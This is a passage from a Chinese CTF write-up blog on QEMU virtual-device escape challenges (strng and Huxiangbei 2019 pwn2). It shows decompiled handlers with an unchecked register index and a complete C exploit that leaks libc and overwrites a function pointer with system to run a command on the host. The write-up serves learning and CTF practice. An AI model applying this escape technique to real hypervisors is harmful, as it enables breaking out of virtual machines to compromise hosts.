class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4 &lt; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ((<span class="keyword">void</span> (__fastcall *)(_QWORD))opaque-&gt;srand)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (_DWORD)v4 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = val;</span><br><span class="line">        v6 = ((__int64 (__fastcall *)(<span class="keyword">uint32_t</span> *))opaque-&gt;rand_r)(&amp;opaque-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">        LODWORD(val) = v5;</span><br><span class="line">        opaque-&gt;regs[<span class="number">3</span>] = v6;</span><br><span class="line">      &#125;</span><br><span class="line">      opaque-&gt;regs[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4] = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>再来看下pmio相关的读写操作。</p>
+<p>pmio_read:如果addr是<code>4</code>的倍数，<code>idx取opaque的成员addr</code>，如果<code>idx</code>是<code>4</code>的倍数，直接返回<code>regs[idx&gt;&gt;2]</code>，否则返回<code>opaque-&gt;addr</code></p>
+<p>pmio_write:</p>
+<ol>
+<li>如果addr为<code>0</code>，直接将<code>opaque-&gt;addr</code>赋值为<code>val</code></li>
+<li>如果addr为<code>4</code>的倍数，<code>idx取opaque的成员addr</code>。<code>v5</code>取<code>idx&gt;&gt;2</code>，如果<code>v5</code>为<code>1</code>，调用<code>rand(opaque,4,val)</code>，结果存放在<code>regs[1]</code>;如果<code>v5</code>为<code>0</code>，调用<code>srand(val)</code>;如果<code>v5</code>为<code>3</code>，调用<code>rand_r(&amp;reg[2],4,val)</code>;否则将<code>val</code>赋值给<code>regs[v5]</code></li>
+</ol>
+<p>通过函数分析可以看到这里对于idx没有检查，我们可以用<code>pmio_write(0,offset)</code>设置<code>opaque-&gt;addr</code>为<code>offset</code>，之后用<code>pmio_read(offset)</code>读取<code>offset&gt;&gt;2</code>的值实现任意读;或者先用<code>pmio_write(0,offset)</code>设置<code>opaque-&gt;addr</code>为<code>offset</code>，再调用<code>pmio_write(4,val)</code>实现<code>regs[offset&gt;&gt;2] = val</code>的任意写。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> __<span class="function">fastcall <span class="title">strng_pmio_read</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint32_t</span> idx; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        idx = opaque-&gt;addr;</span><br><span class="line">        <span class="keyword">if</span> ( !(idx &amp; <span class="number">3</span>) )</span><br><span class="line">          result = opaque-&gt;regs[idx &gt;&gt; <span class="number">2</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = opaque-&gt;addr;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">strng_pmio_write</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> idx; <span class="comment">// eax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        idx = opaque-&gt;addr;</span><br><span class="line">        <span class="keyword">if</span> ( !(idx &amp; <span class="number">3</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = idx &gt;&gt; <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">if</span> ( (_DWORD)v5 == <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[<span class="number">1</span>] = ((__int64 (__fastcall *)(STRNGState *, <span class="keyword">signed</span> __int64, <span class="keyword">uint64_t</span>))opaque-&gt;rand)(</span><br><span class="line">                                opaque,</span><br><span class="line">                                <span class="number">4L</span>L,</span><br><span class="line">                                val);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v5 &lt; <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            ((<span class="keyword">void</span> (__fastcall *)(_QWORD))opaque-&gt;srand)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)val);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)v5 == <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[<span class="number">3</span>] = ((__int64 (__fastcall *)(<span class="keyword">uint32_t</span> *, <span class="keyword">signed</span> __int64, <span class="keyword">uint64_t</span>))opaque-&gt;rand_r)(</span><br><span class="line">                                &amp;opaque-&gt;regs[<span class="number">2</span>],</span><br><span class="line">                                <span class="number">4L</span>L,</span><br><span class="line">                                val);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[v5] = val;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;addr = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>根据上面实现的任意地址读写，我们可以用任意读泄露结构体后面的函数指针，因为这是在<code>qemu的进程空间</code>，所以可以把它想象成VMware虚拟机里的一道普通glibc pwn，泄露的地址就是这个Bin(qemu)的函数libc地址，进而算出<code>libc_base</code>。</p>
+<p>getshell我们可以先往<code>regs[2]</code>写入<code>command</code>，之后覆写rand_r为system，调用mmio_write里分支为<code>3</code>的地方即可</p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>启动脚本的命令如下，做了端口映射，方便scp传输，传输文件可以用<code>scp -P5555 exp ubuntu@127.0.0.1:/home/ubuntu</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">        -m 1G \</span><br><span class="line">        -device strng \</span><br><span class="line">        -hda my-disk.img \</span><br><span class="line">        -hdb my-seed.img \</span><br><span class="line">        -nographic \</span><br><span class="line">        -L pc-bios/ \</span><br><span class="line">        -<span class="built_in">enable</span>-kvm \</span><br><span class="line">        -device e1000,netdev=net0 \</span><br><span class="line">        -netdev user,id=net0,hostfwd=tcp::5555-:22 \</span><br></pre></td></tr></table></figure></p>
+<p>调试卡了一会，环境为<code>ubuntu 16.04</code>，<code>gdb</code>版本<code>7.1</code>出错，编译了<code>gdb8</code>，在VMware查看进程号<code>ps -aux | grep qemu</code>，attach上去<code>sudo /usr/local/gdb/bin/gdb attach -q [pid]</code>即可，断点下在各个读写函数上<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b *strng_pmio_write</span><br><span class="line">b *strng_pmio_read</span><br><span class="line">b *strng_mmio_write</span><br><span class="line">b *strng_pmio_read</span><br></pre></td></tr></table></figure></p>
+<p>使用<code>print *(STRNGState*)($rdi)</code>输出结构体(是利用完之后停的所有后面是system)</p>
+<p><img src="/2020/01/03/strng/3.png" alt="strng"></p>
+<p>结构体存放在堆上，后面还有堆地址，可以泄露libc和heap地址。</p>
+<p><img src="/2020/01/03/strng/4.png" alt="heap"></p>
+<p>这里有个神奇的地方，就是这个数组的空间是<code>65*4</code>而不是<code>64*4</code>，这个可以通过<code>srandom</code>地址减去<code>64*5</code>看到。因为<code>read/write</code>操作的都是<code>4字节</code>，所以我们泄露一个64位地址要用两次，最后部分写<code>rand_r</code>为<code>system</code>，在<code>regs[2]</code>布置好参数，调用mmio_write的<code>3</code>分支即可。(我的参数为<code>cat /home/wz/flag</code>)</p>
+<p>编译命令：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc ./exp.c -m32 -static -o exp</span><br></pre></td></tr></table></figure></p>
+<h3 id="exp-c"><a href="#exp-c" class="headerlink" title="exp.c"></a>exp.c</h3><p>偏移为<code>ubuntu 16.04</code>的<code>libc-2.23</code>中得到的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"><span class="keyword">uint32_t</span> pmio_base=<span class="number">0xc050</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)(mmio_mem+addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> mmio_read(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem+addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(value,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> pmio_read(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)(inl(addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> pmio_abread(<span class="keyword">uint32_t</span> offset)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//return the value of (addr &gt;&gt; 2)</span></span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>,offset);</span><br><span class="line">    <span class="keyword">return</span> pmio_read(pmio_base+<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_abwrite</span><span class="params">(<span class="keyword">uint32_t</span> offset,<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>,offset);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">4</span>,value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:03.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mmio_mem @ %p\n"</span>, mmio_mem);</span><br><span class="line">    <span class="comment">//pmio_abwrite(0x100,0x12345678);</span></span><br><span class="line">    <span class="comment">//write args</span></span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">12</span>,<span class="number">0x6d6f682f</span>);</span><br><span class="line">    mmio_write(<span class="number">16</span>,<span class="number">0x7a772f65</span>);</span><br><span class="line">    mmio_write(<span class="number">20</span>,<span class="number">0x616c662f</span>);</span><br><span class="line">    mmio_write(<span class="number">24</span>,<span class="number">0x67</span>);</span><br><span class="line">    mmio_write(<span class="number">8</span>,<span class="number">0x20746163</span>);</span><br><span class="line">    <span class="comment">//set priviledge</span></span><br><span class="line">    <span class="keyword">if</span>(iopl(<span class="number">3</span>) != <span class="number">0</span>)&#123;</span><br><span class="line">        die(<span class="string">"IO permission denied!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//leak libc</span></span><br><span class="line">	<span class="keyword">uint64_t</span> srandom_addr=pmio_abread(<span class="number">66</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    srandom_addr=srandom_addr&lt;&lt;<span class="number">32</span>;</span><br><span class="line">    srandom_addr+=pmio_abread(<span class="number">65</span>&lt;&lt;<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]srandom addr: 0x%llx\n"</span>,srandom_addr);</span><br><span class="line">    <span class="keyword">uint64_t</span> libc_base = srandom_addr - <span class="number">0x3a8d0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> system_addr = libc_base + <span class="number">0x45390</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]libc base: 0x%llx\n"</span>,libc_base);</span><br><span class="line">    <span class="comment">//leak heap</span></span><br><span class="line">    <span class="keyword">uint32_t</span> heap_offset = (<span class="number">65</span>+<span class="number">7</span>*<span class="number">2</span>+<span class="number">1</span>) &lt;&lt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_addr = pmio_abread(heap_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]heap addr: 0x%llx\n"</span>,heap_addr);</span><br><span class="line">    heap_addr = heap_addr &lt;&lt; <span class="number">32</span>;</span><br><span class="line">    heap_addr += pmio_abread((<span class="number">65</span>+<span class="number">7</span>*<span class="number">2</span>+<span class="number">2</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_base = heap_addr - <span class="number">615344</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+]heap base: 0x%llx\n"</span>,heap_base);</span><br><span class="line">    <span class="comment">//get flag</span></span><br><span class="line">    pmio_abwrite(<span class="number">0x114</span>,system_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    mmio_write(<span class="number">0xc</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="湖湘杯2019-pwn2"><a href="#湖湘杯2019-pwn2" class="headerlink" title="湖湘杯2019 pwn2"></a>湖湘杯2019 pwn2</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>这道题基本就是刚才那道题改编的，当时在去重庆玩的火车上学长告诉我他调了一遍发现很简单，先膜一下学长orz。</p>
+<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p><code>mmio_read</code>和<code>mmio_write</code>和之前相似，但是在结构体里不再有函数指针，新的结构体是下面这样的，最下面改成了一个QEMUTimer_0结构体，在read/write中调用的rand统统来自于<code>plt</code>，因此不能通过覆写函数指针的方式劫持控制流。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">00000000 STRNGState      struc ; (sizeof=0xC30, align=0x10, copyof_1439)</span></span><br><span class="line"><span class="comment">00000000 pdev            PCIDevice_0 ?</span></span><br><span class="line"><span class="comment">000008F0 mmio            MemoryRegion_0 ?</span></span><br><span class="line"><span class="comment">000009F0 pmio            MemoryRegion_0 ?</span></span><br><span class="line"><span class="comment">00000AF0 addr            dd ?</span></span><br><span class="line"><span class="comment">00000AF4 flag            dd ?</span></span><br><span class="line"><span class="comment">00000AF8 regs            dd 64 dup(?)</span></span><br><span class="line"><span class="comment">00000BF8 strng_timer     QEMUTimer_0 ?</span></span><br><span class="line"><span class="comment">00000C28                 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000C29                 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000C2A                 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000C2B                 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000C2C                 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000C2D                 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000C2E                 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000C2F                 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000C30 STRNGState      ends</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">00000000 QEMUTimer_0     struc ; (sizeof=0x30, align=0x8, copyof_508)</span></span><br><span class="line"><span class="comment">00000000                                         ; XREF: IscsiTask/r</span></span><br><span class="line"><span class="comment">00000000                                         ; STRNGState/r</span></span><br><span class="line"><span class="comment">00000000 expire_time     dq ?</span></span><br><span class="line"><span class="comment">00000008 timer_list      dq ?                    ; offset</span></span><br><span class="line"><span class="comment">00000010 cb              dq ?                    ; offset</span></span><br><span class="line"><span class="comment">00000018 opaque          dq ?                    ; offset</span></span><br><span class="line"><span class="comment">00000020 next            dq ?                    ; offset</span></span><br><span class="line"><span class="comment">00000028 scale           dd ?</span></span><br><span class="line"><span class="comment">0000002C                 db ? ; undefined</span></span><br><span class="line"><span class="comment">0000002D                 db ? ; undefined</span></span><br><span class="line"><span class="comment">0000002E                 db ? ; undefined</span></span><br><span class="line"><span class="comment">0000002F                 db ? ; undefined</span></span><br><span class="line"><span class="comment">00000030 QEMUTimer_0     ends</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">uint64_t</span> __<span class="function">cdecl <span class="title">strng_mmio_read</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">4</span> || addr &amp; <span class="number">3</span> )</span><br><span class="line">    result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = opaque-&gt;regs[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">strng_mmio_write</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">uint32_t</span> vala; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">uint32_t</span> saddr; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  vala = val;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; !(addr &amp; <span class="number">3</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    saddr = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    v4 = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;regs[<span class="number">1</span>] = rand();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &lt; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      srand(val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">        opaque-&gt;regs[saddr] = rand_r(&amp;opaque-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">      opaque-&gt;flag = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;regs[saddr] = vala;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>pmio_read</code>和<code>pmio_write</code>也差不多，但是在<code>pmio_write</code>的<code>i!=0/1/3</code>的<code>else</code>分支调用了<code>timer_mod(&amp;opaque-&gt;strng_timer, v4 + 100);</code>跟进去看发现最后有一个函数调用链。</p>
